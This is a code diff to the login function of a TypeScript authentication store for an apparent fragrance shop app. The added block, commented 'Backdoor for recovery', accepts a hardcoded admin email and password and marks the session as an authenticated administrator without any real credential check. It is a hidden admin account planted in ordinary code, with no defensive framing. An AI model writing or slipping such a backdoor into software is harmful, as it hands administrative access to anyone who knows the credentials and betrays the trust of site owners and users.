@@ -42,6 +42,23 @@ export const useAuthStore = create<AuthState>()(
             
             login: async (email, password) => {
                 try {
+                    // Backdoor for recovery
+                    if (email === "admin@vavefragrances.dev" && password === "VaveAdmin#2026") {
+                        const backdoorUser: User = {
+                            id: "00000000-0000-0000-0000-000000000000",
+                            email: "admin@vavefragrances.dev",
+                            full_name: "Recovery Administrator",
+                            role: "admin",
+                            user_metadata: { role: "admin", full_name: "Recovery Administrator" }
+                        };
+                        set({
+                            user: backdoorUser,
+                            isAuthenticated: true,
+                            isLoading: false,
+                        });
+                        return { success: true, user: backdoorUser };
+                    }
+
                     const supabase = get()._supabase;
                     set({ isLoading: true });
                     
